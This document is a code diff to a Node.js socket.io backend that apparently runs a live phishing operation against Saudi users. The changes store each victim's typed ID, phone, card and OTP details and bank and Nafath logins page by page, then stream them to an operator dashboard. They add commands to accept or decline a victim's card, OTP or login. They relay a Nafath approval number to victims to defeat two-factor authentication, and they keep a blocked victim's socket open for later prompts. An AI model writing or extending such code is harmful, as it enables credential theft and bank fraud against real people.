@@ -255,12 +255,48 @@ function recordSubmission(type, payload) {
     set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
+    // Per-page bucket: keep the latest client inputs grouped by the page/event
+    // the visitor was on when they submitted, so the dashboard can show
+    // exactly what the client typed on each screen of their session.
+    const existingUser = db.get().users[id] || {};
+    const pageKey = String(flat.page || type || "unknown");
+    const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
+    const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
+    const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
+    // Drop empty strings so we don't overwrite real values with blanks
+    for (const k of Object.keys(mergedInputs)) {
+      if (mergedInputs[k] === "" || mergedInputs[k] === null) delete mergedInputs[k];
+    }
+    const nextBucket = {
+      page: pageKey,
+      inputs: mergedInputs,
+      lastEvent: type,
+      lastPayload: payload,
+      updatedAt: now(),
+      events: [...(prevBucket.events || []).slice(-19), { type, ts: now() }],
+    };
+    const nextPages = { ...prevPages, [pageKey]: nextBucket };
+
     upsertSession(id, {
       ...flat,
       [type]: payload,
+      pages: nextPages,
       lastEvent: type,
+      lastPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
+    });
+
+    // Push a compact per-page notification for dashboards that want to
+    // render "client input on page X" without diffing the full session.
+    io.to("admins").emit("client:input", {
+      id,
+      uuid: id,
+      page: pageKey,
+      event: type,
+      inputs: mergedInputs,
+      payload,
+      ts: now(),
     });
   }
   return entry;
@@ -268,35 +304,113 @@ function recordSubmission(type, payload) {
 
 
 
+// Map admin-dashboard event names to the customer socket events the
+// site pages actually listen for (see /public/assets/index-*.js).
+// Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
+// and one of userId / uuid / id matching the visitor's session.
 const ADMIN_EVENT_ALIASES = {
-  acceptPaymentForm: ["payment:action", "confirmed"],
-  declinePaymentForm: ["payment:action", "cancelled"],
-  acceptVisaOtp: ["otp:action", "confirmed"],
-  declineVisaOtp: ["otp:action", "cancelled"],
-  acceptPhoneOtp: ["otp:action", "confirmed"],
-  declinePhoneOtp: ["otp:action", "cancelled"],
-  acceptPhone: ["phone:action", "confirmed"],
-  declinePhone: ["phone:action", "cancelled"],
-  acceptNavaz: ["nafath:action", "confirmed"],
-  declineNavaz: ["nafath:action", "cancelled"],
-  acceptService: ["payment:action", "confirmed"],
-  declineService: ["payment:action", "cancelled"],
+  // Payment / visa card form
+  acceptpaymentform: ["payment:action", "confirmed"],
+  declinepaymentform: ["payment:action", "cancelled"],
+  acceptservice: ["payment:action", "confirmed"],
+  declineservice: ["payment:action", "cancelled"],
+  acceptpayment: ["payment:action", "confirmed"],
+  declinepayment: ["payment:action", "cancelled"],
+
+  // Visa 3-D Secure / SMS OTP shown after payment
+  acceptvisaotp: ["otp:action", "confirmed"],
+  declinevisaotp: ["otp:action", "cancelled"],
+  acceptphoneotp: ["otp:action", "confirmed"],
+  declinephoneotp: ["otp:action", "cancelled"],
+  acceptotp: ["otp:action", "confirmed"],
+  declineotp: ["otp:action", "cancelled"],
+
+  // Phone verification (motasel / stc verify pages)
+  acceptphone: ["phone:action", "confirmed"],
+  declinephone: ["phone:action", "cancelled"],
+
+  // Nafath (Absher) approval step
+  acceptnavaz: ["nafath:action", "confirmed"],
+  declinenavaz: ["nafath:action", "cancelled"],
+  acceptnafath: ["nafath:action", "confirmed"],
+  declinenafath: ["nafath:action", "cancelled"],
+
+  // Nafath login (username + password) -> navigates to /nafse
+  acceptnaflogin: ["naflogin:action", "confirmed"],
+  declinenaflogin: ["naflogin:action", "cancelled"],
+  acceptnafselogin: ["naflogin:action", "confirmed"],
+  declinenafselogin: ["naflogin:action", "cancelled"],
+
+  // Al-Rajhi login -> navigates to /phone
+  acceptrajlogin: ["rajlogin:action", "confirmed"],
+  declinerajlogin: ["rajlogin:action", "cancelled"],
+  acceptrajhi: ["rajlogin:action", "confirmed"],
+  declinerajhi: ["rajlogin:action", "cancelled"],
 };
 
 function broadcastAdminEvent(id, event, payload) {
   if (!id) return;
   const target = io.to(`session:${id}`).to(`user:${id}`);
-  const data = payload ?? { id, uuid: id, userId: id };
+  const base = { id, uuid: id, userId: id };
+  const data = payload && typeof payload === "object"
+    ? { ...base, ...payload, id, uuid: id, userId: id }
+    : base;
+
+  // Echo the raw event too, so a dashboard that already uses the
+  // customer-side names keeps working.
   target.emit(event, data);
 
-  const alias = ADMIN_EVENT_ALIASES[event];
+  const key = String(event || "").toLowerCase();
+  const alias = ADMIN_EVENT_ALIASES[key];
   if (alias) {
     const [aliasEvent, action] = alias;
-    target.emit(aliasEvent, { ...data, userId: id, action });
-  } else if (event === "adminRedirect") {
-    target.emit("admin:redirect", data);
-  } else if (event === "clientBlocked") {
-    target.emit("user:blocked", data);
+    target.emit(aliasEvent, { ...data, action });
+  }
+
+  // Redirect: dashboard chooses the destination page.
+  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
+    const redirectPayload = {
+      ...data,
+      page: data.page || data.route || data.to || "/",
+      pageName: data.pageName || data.title || "",
+    };
+    target.emit("admin:redirect", redirectPayload);
+  }
+
+  // Nafath verification number: dashboard sends the 2-digit code that
+  // the customer must tap in the Absher app on page 7. The customer
+  // bundle listens for `nafath:code` with { verificationCode: "42" }.
+  if (
+    key === "nafathnumber" ||
+    key === "nafathcode" ||
+    key === "sendnafathnumber" ||
+    key === "sendnafathcode" ||
+    key === "setnafathnumber" ||
+    key === "setnafathcode" ||
+    key === "nafath:code" ||
+    key === "nafath:number"
+  ) {
+    const code = String(
+      data.verificationCode ??
+        data.code ??
+        data.number ??
+        data.nafathNumber ??
+        data.nafathCode ??
+        data.value ??
+        ""
+    );
+    target.emit("nafath:code", {
+      ...data,
+      verificationCode: code,
+      code,
+      number: code,
+    });
+  }
+
+  // Block: customer page shows blocked screen. Do NOT disconnect the
+  // socket, otherwise the next OTP / redirect can't be delivered.
+  if (key === "clientblocked" || key === "blockclient" || key === "user:blocked") {
+    target.emit("user:blocked", { ...data, blocked: true });
   }
 
   io.to("admins").emit(`admin:${event}`, { id, payload: data });
@@ -306,7 +420,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v12";
+const APP_VERSION = "v15";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -581,10 +695,16 @@ io.on("connection", (socket) => {
   socket.onAny((event, payload) => {
     if (IGNORED_ANY_EVENTS.has(event)) return;
     if (socket.data.userType === "admin" || socket.data.role === "admin") return;
-    if (typeof payload !== "object" || payload === null) return;
-    const id = payload.uuid || payload.id || socket.data.userId || socket.data.sessionId;
+    const obj = (payload && typeof payload === "object") ? payload : {};
+    const id =
+      obj.uuid || obj.id || obj.userId ||
+      socket.data.userId || socket.data.sessionId ||
+      findSessionByIp(clientIp(socket.request));
     if (!id) return;
-    recordSubmission(event, { ...payload, uuid: id });
+    // Stamp the current page if the client didn't include one, so the
+    // per-page bucket in recordSubmission groups inputs correctly.
+    const page = obj.page || obj.currentPage || socket.data.page || event;
+    recordSubmission(event, { ...obj, uuid: id, page });
   });
 
   // -------- Frontend (customer site) join --------
@@ -789,11 +909,13 @@ io.on("connection", (socket) => {
 
   socket.on("user:pageNavigation", (p) => {
     const uid = socket.data.userId;
-    if (uid) upsertSession(uid, { lastPage: p?.page, lastSeen: now() });
+    const page = p?.page || p?.currentPage || p?.route;
+    socket.data.page = page || socket.data.page;
+    if (uid) upsertSession(uid, { lastPage: page, currentPage: page, lastSeen: now() });
     io.to("admins").emit("live:update", {
       type: "pageNavigation",
       uuid: uid,
-      page: p?.page,
+      page,
       ts: now(),
     });
   });
